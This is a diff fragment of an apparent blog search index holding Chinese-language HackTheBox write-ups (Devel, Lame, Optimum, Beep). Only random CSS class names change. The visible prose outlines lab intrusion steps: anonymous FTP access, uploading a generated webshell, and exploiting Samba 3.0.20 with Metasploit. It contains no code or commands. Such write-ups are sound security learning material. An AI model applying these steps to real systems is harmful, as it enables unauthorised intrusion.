-    <content><![CDATA[<style>.agyflnbqnsgx{zoom:50%;}</style><img src="/Hackthebox/htb/htb-devel/0fb6455a29eb4f2682f04a780ce26cb1.png" class="agyflnbqnsgx">
+    <content><![CDATA[<style>.atqadolrhknu{zoom:50%;}</style><img src="/Hackthebox/htb/htb-devel/0fb6455a29eb4f2682f04a780ce26cb1.png" class="atqadolrhknu">
 
 <span id="more"></span>
 
@@ -4050,7 +4200,7 @@ oAvexd1JRMkbC7YOgrzZ9iOxHP+mg/LLENmHimcyKCqaY3XzqXqk9lOhA3ymOcLw
 <h3 id="Nmap-scan"><a href="#Nmap-scan" class="headerlink" title="Nmap scan"></a>Nmap scan</h3><img src="/Hackthebox/htb/htb-devel/image-20250201213314487.png" class="" title="Nmap">
 
 <p>发现两个开放端口 21和80，FTP允许匿名登录，先登录FTP看看，FTP的目录底下是主站点的文件</p>
-<style>.fwpxdbdqczxd{zoom:150%;}</style><img src="/Hackthebox/htb/htb-devel/image-20250201213757511.png" class="fwpxdbdqczxd" alt="登录FTP">
+<style>.czsuowchhjnc{zoom:150%;}</style><img src="/Hackthebox/htb/htb-devel/image-20250201213757511.png" class="czsuowchhjnc" alt="登录FTP">
 
 <h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>生成一个webshell然后通过ftp上传</p>
 <img src="/Hackthebox/htb/htb-devel/image-20250201215256322.png" class="" title="生成webshell">
@@ -4092,7 +4242,7 @@ oAvexd1JRMkbC7YOgrzZ9iOxHP+mg/LLENmHimcyKCqaY3XzqXqk9lOhA3ymOcLw
   <entry>
     <title>HTB-Lame</title>
     <url>/Hackthebox/htb/htb-lame/</url>
-    <content><![CDATA[<style>.hngrjtcyfcrb{zoom:50%;}</style><img src="/Hackthebox/htb/htb-lame/fb2d9f98400e3c802a0d7145e125c4ff.png" class="hngrjtcyfcrb">
+    <content><![CDATA[<style>.vdotnebyrtfu{zoom:50%;}</style><img src="/Hackthebox/htb/htb-lame/fb2d9f98400e3c802a0d7145e125c4ff.png" class="vdotnebyrtfu">
 
 <span id="more"></span>
 
@@ -4108,11 +4258,11 @@ oAvexd1JRMkbC7YOgrzZ9iOxHP+mg/LLENmHimcyKCqaY3XzqXqk9lOhA3ymOcLw
 <td>Easy</td>
 </tr>
 </tbody></table>
-<h3 id="Nmap-Scan"><a href="#Nmap-Scan" class="headerlink" title="Nmap Scan"></a>Nmap Scan</h3><style>.yycktcykjwki{zoom:150%;}</style><img src="/Hackthebox/htb/htb-lame/image-20250201155450222.png" class="yycktcykjwki" alt="Nmap">
+<h3 id="Nmap-Scan"><a href="#Nmap-Scan" class="headerlink" title="Nmap Scan"></a>Nmap Scan</h3><style>.enojixliastr{zoom:150%;}</style><img src="/Hackthebox/htb/htb-lame/image-20250201155450222.png" class="enojixliastr" alt="Nmap">
 
 <p>发现两个可疑服务21(vsftpd 2.3.4)和445(Samba 3.0.20)，使用searchsploit 检索可用exp<img src="/Hackthebox/htb/htb-lame/image-20250201160141376.png" class="" title="searchploit"></p>
 <h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>使用vsftpd的漏洞，失败，换smb漏洞, 成功</p>
-<style>.osrsgttfgwys{zoom:150%;}</style><img src="/Hackthebox/htb/htb-lame/image-20250201174838005.png" class="osrsgttfgwys" alt="msfconsole">
+<style>.tctocwgtsuqg{zoom:150%;}</style><img src="/Hackthebox/htb/htb-lame/image-20250201174838005.png" class="tctocwgtsuqg" alt="msfconsole">
 
 <img src="/Hackthebox/htb/htb-lame/image-20250201175040335.png" class="" title="searchsploit">
 
@@ -4145,7 +4295,7 @@ oAvexd1JRMkbC7YOgrzZ9iOxHP+mg/LLENmHimcyKCqaY3XzqXqk9lOhA3ymOcLw
   <entry>
     <title>HTB-Optimum</title>
     <url>/Hackthebox/htb/htb-optimum/</url>
-    <content><![CDATA[<style>.mbotdiqcnjxn{zoom:50%;}</style><img src="/Hackthebox/htb/htb-optimum/bb09ffeaffe2f5220a1d591bb7b4f95e.png" class="mbotdiqcnjxn">
+    <content><![CDATA[<style>.tvwqmjorznul{zoom:50%;}</style><img src="/Hackthebox/htb/htb-optimum/bb09ffeaffe2f5220a1d591bb7b4f95e.png" class="tvwqmjorznul">
 
 <span id="more"></span>
 
@@ -4207,7 +4357,7 @@ oAvexd1JRMkbC7YOgrzZ9iOxHP+mg/LLENmHimcyKCqaY3XzqXqk9lOhA3ymOcLw
   <entry>
     <title>HTB-Beep</title>
     <url>/Hackthebox/htb/htb-beep/</url>
-    <content><![CDATA[<style>.gbvtnriliftg{zoom:50%;}</style><img src="/Hackthebox/htb/htb-beep/995f465295b99869fce21ecadea4604c.png" class="gbvtnriliftg">
+    <content><![CDATA[<style>.ejuiqnhjhbip{zoom:50%;}</style><img src="/Hackthebox/htb/htb-beep/995f465295b99869fce21ecadea4604c.png" class="ejuiqnhjhbip">
 
 <span id="more"></span>
 
